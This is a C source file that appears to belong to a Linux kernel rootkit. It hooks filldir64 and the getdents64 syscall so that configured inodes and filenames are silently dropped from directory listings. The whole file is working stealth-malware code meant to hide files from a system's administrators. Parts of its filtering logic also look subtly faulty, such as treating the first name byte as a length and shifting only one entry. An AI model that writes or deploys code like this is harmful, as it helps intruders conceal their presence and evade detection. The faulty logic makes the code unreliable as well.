#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <asm/syscall_wrapper.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/uaccess.h>

#include <hide/readdir.h>
#include <license.h>
#include <ksyms.h>
#include <config.h>
#include <common.h>
#include <hook.h>

#define unsafe_copy_dirent_name(_dst, _src, _len, label) do {   \
    char __user *dst = (_dst);                                  \
    const char *src = (_src);                                   \
    size_t len = (_len);                                        \
    unsafe_put_user(0, dst+len, label);                         \
    unsafe_copy_to_user(dst, src, len, label);                  \
} while (0)

struct getdents_callback64 {
    struct dir_context ctx;
    struct linux_dirent64 __user * current_dir;
    int prev_reclen;
    int count;
    int error;
};

static int filldir64_hook(struct dir_context *ctx,
    const char *name, int namlen, loff_t offset,
    u64 ino, unsigned int d_type)
{
    /* original filldir64 code */    

    struct linux_dirent64 __user *dirent, *prev;
    struct getdents_callback64 *buf = container_of(ctx, struct getdents_callback64, ctx);
    int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1, sizeof(u64));
    int prev_reclen;

    /* hook code */

    int i;

    // hide configured inodes
    for (i = 0; i < hide_inodes_count; i++) {
        if (ino == hide_inodes[i])
            return 0;
    }

    // hide configured filenames (not full paths)
    for (i = 0; i < hide_filenames_count; i++) {
        if (!strncmp(name, hide_filenames[i], namlen))
            return 0;
    }

    /* original filldir64 code */

    buf->error = ksyms__verify_dirent_name(name, namlen);
    if (unlikely(buf->error))
        return buf->error;
    buf->error = -EINVAL;
    if (reclen > buf->count)
        return -EINVAL;
    prev_reclen = buf->prev_reclen;
    if (prev_reclen && signal_pending(current))
        return -EINTR;
    dirent = buf->current_dir;
    prev = (void __user *)dirent - prev_reclen;
    if (!user_write_access_begin(prev, reclen + prev_reclen))
        goto efault;

    unsafe_put_user(offset, &prev->d_off, efault_end);
    unsafe_put_user(ino, &dirent->d_ino, efault_end);
    unsafe_put_user(reclen, &dirent->d_reclen, efault_end);
    unsafe_put_user(d_type, &dirent->d_type, efault_end);
    unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
    user_write_access_end();

    buf->prev_reclen = reclen;
    buf->current_dir = (void __user *)dirent + reclen;
    buf->count -= reclen;
    return 0;

efault_end:
    user_write_access_end();
efault:
    buf->error = -EFAULT;
    return -EFAULT;
}

struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};

static long __x64_sys_getdents64_hook(const struct pt_regs *regs)
{
    // syscall args
    int fd = (int)regs->di;
    struct linux_dirent *user = (void *)regs->si;
    size_t count = (size_t)regs->dx;

    int res = 0, i = 0, j = 0;
    struct linux_dirent *cur_dirent, *filtered;
    struct file *f;
    char *fd_path_buf, *fd_path;
    size_t fd_path_len;
    char *dirent_name, *hide_cursor;
    u8 dirent_name_len;

    fd_path_buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!fd_path_buf) {
        // ENOMEM is not supposed to be returned by this syscall
        res = -EINVAL;
        goto error_fd_path;
    }

    // find fd's path and create string
    f = current->files->fdt->fd[fd];
    fd_path = d_path(&f->f_path, fd_path_buf, PAGE_SIZE);
    fd_path_len = strlen(fd_path);

    // allocate buffer to work on unfiltered dirents
    filtered = kmalloc(count, GFP_KERNEL);
    if (!filtered) {
        res = -EINVAL;
        goto error_filtered;
    }

    // perform original getdents64 on user supplied buffer
    // TODO: avoid user supplied buffer and pass a private buffer instead
    // args.si = (unsigned long)filtered;
    res = hook_original__x64_sys_getdents64(regs);
    if (res < 0) {
        goto exit;
    }

    // copy contents of user buffer to private buffer
    if (__copy_from_user(filtered, user, count)) {
        res = -EINVAL;
        goto exit;
    }

    for (j = 0; j < hide_filenames_count; j++) {
        hide_cursor = hide_filenames[j];

        // check if the current hide file starts with fd's path
        if (strncmp(hide_cursor, fd_path, fd_path_len))
            continue;

        hide_cursor += fd_path_len;

        // if hide is exactly fd's path, don't hide children dirents (*hide_cursor == '\0').
        // if hide matches the path base by chance, also don't do anything.
        if (*hide_cursor != '/')
            continue;

        // if the hide is set to a file UNDER fd's path, iterate all dirents
        hide_cursor += 1;
        i = 0;
        cur_dirent = filtered;
        while (i < res) {
            dirent_name_len = cur_dirent->d_name[0];
            dirent_name = &cur_dirent->d_name[1];

            // compare the rest of the path with the file name
            if (strncmp(hide_cursor, dirent_name, dirent_name_len))
                goto next;

            // if dirent_name is not the exact end of hide, do nothing
            if (*(hide_cursor + dirent_name_len + 1) != '\0')
                goto next;
            
            // copy next dirent, subtract from res, and continue without incrementing i or cur_dirent
            res -= cur_dirent->d_reclen;
            memcpy(cur_dirent, (void *)cur_dirent + cur_dirent->d_reclen,
                ((struct linux_dirent *)((void *)cur_dirent + cur_dirent->d_reclen))->d_reclen);
            continue;

        next:
            i += cur_dirent->d_reclen;
            cur_dirent = (struct linux_dirent *)((void *)filtered + i);
        }
    }

    // zero out the bytes left over from truncating res
    memset((void *)filtered + res, 0, count - res);

exit:
    // copy filtered buffer to user
    // we have nothing to do if this fails
    (void)(__copy_to_user(user, filtered, count) + 1);
    kfree(filtered);

error_filtered:
    kfree(fd_path_buf);

error_fd_path:
    return res;
}

HOOK_DEFINE(hide, filldir64, ksyms__filldir64, &filldir64_hook);
HOOK_X64_SYSCALL_DEFINE(hide, getdents64, 217, &__x64_sys_getdents64_hook);
